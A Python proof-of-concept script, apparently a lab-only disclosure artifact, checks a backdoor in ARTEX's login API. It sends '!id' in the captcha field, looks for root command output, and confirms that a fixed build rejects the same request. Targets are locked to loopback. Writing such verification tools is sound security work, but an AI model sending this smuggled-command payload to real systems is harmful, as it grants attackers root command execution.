#!/usr/bin/env python3
"""Lab-only, self-checking ARTEX backdoor proof over the public HTTP route."""

import argparse
import http.client
import json
import re
import sys
from pathlib import Path
from urllib.parse import urlsplit


def load_profile(name: str) -> tuple[str, int, str]:
    registry = json.loads((Path(__file__).parent / "profiles.json").read_text())
    profile = registry["profiles"].get(name)
    if profile is None or name not in {"affected", "fixed_control"}:
        raise ValueError("unknown profile")
    url = urlsplit(profile["url"])
    port = profile["port"]
    if (url.scheme != "http" or url.hostname != "127.0.0.1" or
            url.port != port or port not in {18787, 18788} or
            url.username or url.password or url.query or url.fragment or
            url.path not in {"", "/"}):
        raise ValueError("profile target must be the shipped loopback lab")
    return url.hostname, port, profile["expect"]


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--profile", default="affected", choices=("affected", "fixed_control"))
    args = parser.parse_args()
    try:
        host, port, expected = load_profile(args.profile)
        body = json.dumps({"username": "wrong", "password": "wrong", "captcha": "!id"}).encode()
        print("proof_command=id", flush=True)
        connection = http.client.HTTPConnection(host, port, timeout=5)
        try:
            connection.request("POST", "/api/auth/login", body=body,
                               headers={"Content-Type": "application/json"})
            response = connection.getresponse()
            status = response.status
            raw = response.read(4096)
        finally:
            connection.close()
        data = json.loads(raw)
        print(json.dumps({"profile": args.profile, "status": status}, sort_keys=True), flush=True)
        output = data.get("captcha", "") if isinstance(data, dict) else ""
        if expected == "root-id":
            if status != 200 or not isinstance(output, str):
                raise ValueError("expected HTTP 200 with command output")
            if not re.search(r"\buid=0\(root\).*\bgid=0\(root\)", output):
                raise ValueError("fresh root identity proof missing")
            print("PROOF: " + output.strip(), flush=True)
            print("PASS: container-root command execution observed", flush=True)
        elif expected == "rejected":
            if status != 401 or output or "uid=" in raw.decode(errors="replace"):
                raise ValueError("comparison build did not reject the request")
            print("PASS: same request rejected by comparison build", flush=True)
        else:
            raise ValueError("unknown expected result")
        return 0
    except (OSError, ValueError, KeyError, json.JSONDecodeError) as exc:
        print(f"FAIL: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
